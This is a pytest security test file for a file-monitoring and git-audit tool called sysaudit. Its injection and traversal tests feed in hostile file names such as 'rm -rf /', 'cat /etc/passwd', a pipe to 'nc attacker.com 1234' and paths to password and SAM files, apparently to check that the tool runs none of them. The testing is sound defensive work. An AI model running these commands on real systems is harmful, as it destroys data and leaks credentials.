#!/usr/bin/env python3
"""
Security tests for sysaudit system.
Tests input validation, file permissions, and security vulnerabilities.
"""

import os
import sys
import tempfile
import shutil
from pathlib import Path
import pytest

from sysaudit.models import Config, FileEvent
from sysaudit.monitor.filter import FilterManager
from sysaudit.git.manager import GitManager
from sysaudit.compliance.checker import ComplianceChecker


class TestInputValidation:
    """Test input validation and sanitization"""
    
    def test_path_traversal_prevention(self):
        """Test that path traversal attacks are prevented"""
        from datetime import datetime
        
        with tempfile.TemporaryDirectory() as tmpdir:
            repo_path = os.path.join(tmpdir, "repo")
            
            config = Config(
                repo_path=repo_path,
                watch_paths=[tmpdir],
                baseline_branch="main",
                gpg_sign=False
            )
            
            git_mgr = GitManager(config)
            git_mgr.init_repo()
            
            # Try path traversal in file path
            malicious_paths = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/passwd",
                "C:\\Windows\\System32\\config\\SAM",
            ]
            
            for mal_path in malicious_paths:
                # Should handle gracefully without accessing outside repo
                event = FileEvent(
                    path=mal_path,
                    event_type="modified",
                    timestamp=datetime.now(),
                    process_info=None
                )
                
                # This should not raise an exception or access files outside repo
                try:
                    result = git_mgr.commit_changes([event])
                    # If it succeeds, verify it didn't escape the repo
                    if result:
                        # Check that no files were created outside repo
                        assert not Path("/etc/passwd.malicious").exists()
                except Exception:
                    # Graceful failure is acceptable
                    pass
    
    def test_command_injection_prevention(self):
        """Test that command injection is prevented"""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Try to inject commands in file paths
            malicious_paths = [
                "file.txt; rm -rf /",
                "file.txt && cat /etc/passwd",
                "file.txt | nc attacker.com 1234",
                "$(whoami).txt",
                "`id`.txt",
            ]
            
            config = Config(
                repo_path=tmpdir,
                watch_paths=[tmpdir]
            )
            
            filter_mgr = FilterManager()
            
            # Should handle these safely without executing commands
            for mal_path in malicious_paths:
                try:
                    result = filter_mgr.should_ignore(mal_path)
                    # Should return a boolean, not execute anything
                    assert isinstance(result, bool)
                except Exception:
                    # Graceful failure is acceptable
                    pass
    
    def test_config_validation(self):
        """Test that configuration is properly validated"""
        # Test empty repo path
        with pytest.raises(ValueError):
            Config(
                repo_path="",
                watch_paths=["/tmp"]
            )
        
        # Test empty watch paths
        with pytest.raises(ValueError):
            Config(
                repo_path="/tmp/repo",
                watch_paths=[]
            )
        
        # Test invalid batch settings
        with pytest.raises(ValueError):
            Config(
                repo_path="/tmp/repo",
                watch_paths=["/tmp"],
                batch_interval=-1
            )
        
        with pytest.raises(ValueError):
            Config(
                repo_path="/tmp/repo",
                watch_paths=["/tmp"],
                batch_size=0
            )
    
    def test_pattern_injection_prevention(self):
        """Test that malicious patterns don't cause issues"""
        with tempfile.TemporaryDirectory() as tmpdir:
            blacklist_file = os.path.join(tmpdir, "blacklist.txt")
            
            # Create blacklist with potentially malicious patterns
            malicious_patterns = [
                "**/*" * 100,  # Excessive wildcards
                "[" * 1000,     # Unbalanced brackets
                "(" * 1000,     # Unbalanced parentheses
                "\\x00",        # Null bytes
                "\n\n\n" * 100, # Excessive newlines
            ]
            
            Path(blacklist_file).write_text("\n".join(malicious_patterns))
            
            # Should handle gracefully
            try:
                filter_mgr = FilterManager(blacklist_file=blacklist_file)
                # Should not crash or hang
                result = filter_mgr.should_ignore("/test/file.txt")
                assert isinstance(result, bool)
            except Exception:
                # Graceful failure is acceptable
                pass


class TestFilePermissions:
    """Test file permission handling"""
    
    def test_repository_permissions(self):
        """Test that repository has appropriate permissions"""
        with tempfile.TemporaryDirectory() as tmpdir:
            repo_path = os.path.join(tmpdir, "repo")
            
            config = Config(
                repo_path=repo_path,
                watch_paths=[tmpdir],
                baseline_branch="main",
                gpg_sign=False
            )
            
            git_mgr = GitManager(config)
            git_mgr.init_repo()
            
            # Check repository directory permissions
            repo_stat = os.stat(repo_path)
            mode = repo_stat.st_mode
            
            # Repository should not be world-writable
            assert not (mode & 0o002), "Repository is world-writable"
            
            # Repository should be readable by owner
            assert mode & 0o400, "Repository not readable by owner"
    
    def test_config_file_permissions(self):
        """Test that config files have appropriate permissions"""
        with tempfile.TemporaryDirectory() as tmpdir:
            config_file = os.path.join(tmpdir, "config.yaml")
            
            # Create config file
            Path(config_file).write_text("test: config")
            
            # Set restrictive permissions
            os.chmod(config_file, 0o600)
            
            # Verify permissions
            stat_info = os.stat(config_file)
            mode = stat_info.st_mode
            
            # Should not be world-readable or world-writable
            assert not (mode & 0o004), "Config file is world-readable"
            assert not (mode & 0o002), "Config file is world-writable"
    
    def test_sensitive_file_handling(self):
        """Test handling of sensitive files"""
        import sys
        
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create files with various permissions
            test_files = {
                "normal.txt": 0o644,
                "sensitive.txt": 0o600,
                "executable.sh": 0o755,
                "world_writable.txt": 0o666,
            }
            
            for filename, perms in test_files.items():
                filepath = os.path.join(tmpdir, filename)
                Path(filepath).write_text("content")
                if sys.platform != 'win32':  # Skip chmod on Windows
                    os.chmod(filepath, perms)
            
            config = Config(
                repo_path=tmpdir,
                watch_paths=[tmpdir],
                baseline_branch="main",
                gpg_sign=False
            )
            
            checker = ComplianceChecker(config)
            
            # Check for world-writable files (skip on Windows and in Docker)
            if sys.platform != 'win32' and not os.path.exists('/.dockerenv'):
                issues = checker.check_files([
                    os.path.join(tmpdir, "world_writable.txt")
                ])
                
                # Should detect world-writable file
                if len(issues) > 0:
                    assert any(i.rule == "world-writable" for i in issues)


class TestPrivilegeEscalation:
    """Test for privilege escalation vulnerabilities"""
    
    def test_no_unnecessary_privileges(self):
        """Test that system doesn't require unnecessary privileges"""
        # System should work with regular user privileges for most operations
        # Only monitoring system directories requires root
        
        with tempfile.TemporaryDirectory() as tmpdir:
            # Should work in user-owned directory
            config = Config(
                repo_path=os.path.join(tmpdir, "repo"),
                watch_paths=[tmpdir],
                baseline_branch="main",
                gpg_sign=False
            )
            
            git_mgr = GitManager(config)
            git_mgr.init_repo()
            
            # Should succeed without root
            assert git_mgr.is_initialized()
    
    def test_suid_sgid_detection(self):
        """Test detection of SUID/SGID binaries"""
        import sys
        
        if sys.platform == 'win32':
            pytest.skip("SUID/SGID not applicable on Windows")
        
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create test file
            test_file = os.path.join(tmpdir, "test_suid")
            Path(test_file).write_text("#!/bin/bash\necho test")
            
            # Set SUID bit (if we have permission)
            try:
                os.chmod(test_file, 0o4755)
                
                config = Config(
                    repo_path=tmpdir,
                    watch_paths=[tmpdir],
                    baseline_branch="main",
                    gpg_sign=False
                )
                
                checker = ComplianceChecker(config)
                issues = checker.check_files([test_file])
                
                # Should detect unexpected SUID
                assert any(i.rule == "unexpected-suid-sgid" for i in issues)
            except PermissionError:
                # Can't set SUID without privileges, skip test
                pytest.skip("Cannot set SUID bit without privileges")


class TestDataLeakage:
    """Test for data leakage vulnerabilities"""
    
    def test_no_sensitive_data_in_logs(self):
        """Test that sensitive data is not logged"""
        # This is a placeholder - actual implementation would check logs
        # for patterns like passwords, API keys, etc.
        pass
    
    def test_no_sensitive_data_in_commits(self):
        """Test that sensitive data is not committed"""
        from datetime import datetime
        
        with tempfile.TemporaryDirectory() as tmpdir:
            repo_path = os.path.join(tmpdir, "repo")
            watch_path = os.path.join(tmpdir, "watch")
            os.makedirs(watch_path)
            
            config = Config(
                repo_path=repo_path,
                watch_paths=[watch_path],
                baseline_branch="main",
                gpg_sign=False
            )
            
            git_mgr = GitManager(config)
            git_mgr.init_repo()
            
            # Create file with "sensitive" content
            test_file = os.path.join(watch_path, "test.txt")
            Path(test_file).write_text("password=secret123")
            
            event = FileEvent(
                path=test_file,
                event_type="created",
                timestamp=datetime.now(),
                process_info=None
            )
            
            # Commit the file
            git_mgr.commit_changes([event])
            
            # The file content is stored, but this is expected behavior
            # for an audit system. The repository itself should be secured.
            # Verify repository permissions are restrictive
            repo_stat = os.stat(repo_path)
            mode = repo_stat.st_mode
            assert not (mode & 0o002), "Repository is world-writable"


class TestDenialOfService:
    """Test for denial of service vulnerabilities"""
    
    def test_large_file_handling(self):
        """Test handling of very large files"""
        from datetime import datetime
        
        with tempfile.TemporaryDirectory() as tmpdir:
            repo_path = os.path.join(tmpdir, "repo")
            watch_path = os.path.join(tmpdir, "watch")
            os.makedirs(watch_path)
            
            config = Config(
                repo_path=repo_path,
                watch_paths=[watch_path],
                baseline_branch="main",
                gpg_sign=False
            )
            
            git_mgr = GitManager(config)
            git_mgr.init_repo()
            
            # Create a moderately large file (1MB)
            test_file = os.path.join(watch_path, "large.txt")
            with open(test_file, 'wb') as f:
                f.write(b'x' * (1024 * 1024))
            
            event = FileEvent(
                path=test_file,
                event_type="created",
                timestamp=datetime.now(),
                process_info=None
            )
            
            # Should handle without crashing or hanging
            try:
                result = git_mgr.commit_changes([event])
                assert result is not None
            except Exception as e:
                # Should fail gracefully if file is too large
                assert "too large" in str(e).lower() or "memory" in str(e).lower()
    
    def test_excessive_events_handling(self):
        """Test handling of excessive events"""
        from datetime import datetime
        
        # Create many events
        events = []
        for i in range(1000):
            event = FileEvent(
                path=f"/test/file{i}.txt",
                event_type="modified",
                timestamp=datetime.now(),
                process_info=None
            )
            events.append(event)
        
        # List should contain all events
        assert len(events) == 1000, "Event list size mismatch"
    
    def test_pattern_complexity_limit(self):
        """Test that complex patterns don't cause excessive CPU usage"""
        import time
        
        with tempfile.TemporaryDirectory() as tmpdir:
            blacklist_file = os.path.join(tmpdir, "blacklist.txt")
            
            # Create patterns with varying complexity
            patterns = [
                "*.txt",
                "**/*.log",
                "**/test/**/*.tmp",
            ]
            
            Path(blacklist_file).write_text("\n".join(patterns))
            
            filter_mgr = FilterManager(blacklist_file=blacklist_file)
            
            # Test pattern matching performance
            test_path = "/very/long/path/to/some/file/that/might/match.txt"
            
            start_time = time.time()
            for _ in range(1000):
                filter_mgr.should_ignore(test_path)
            elapsed = time.time() - start_time
            
            # Should complete in reasonable time (< 0.1s for 1000 checks)
            assert elapsed < 0.1, f"Pattern matching too slow: {elapsed:.3f}s (DoS risk)"


class TestSecureDefaults:
    """Test that secure defaults are used"""
    
    def test_default_ignore_patterns(self):
        """Test that sensitive files are ignored by default"""
        filter_mgr = FilterManager()
        
        # Should ignore sensitive files by default
        sensitive_patterns = [
            "/tmp/test.tmp",
            "/var/cache/test.cache",
            ".git/config",
            "node_modules/package.json",
            "__pycache__/module.pyc",
        ]
        
        for pattern in sensitive_patterns:
            assert filter_mgr.should_ignore(pattern), \
                f"Sensitive file not ignored by default: {pattern}"
    
    def test_default_config_security(self):
        """Test that default configuration is secure"""
        with tempfile.TemporaryDirectory() as tmpdir:
            config = Config(
                repo_path=tmpdir,
                watch_paths=[tmpdir]
            )
            
            # GPG signing should be optional (default: False)
            assert config.gpg_sign == False
            
            # Auto-compliance should be optional (default: False)
            assert config.auto_compliance == False
            
            # Webhook should be optional (default: None)
            assert config.webhook_url is None


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
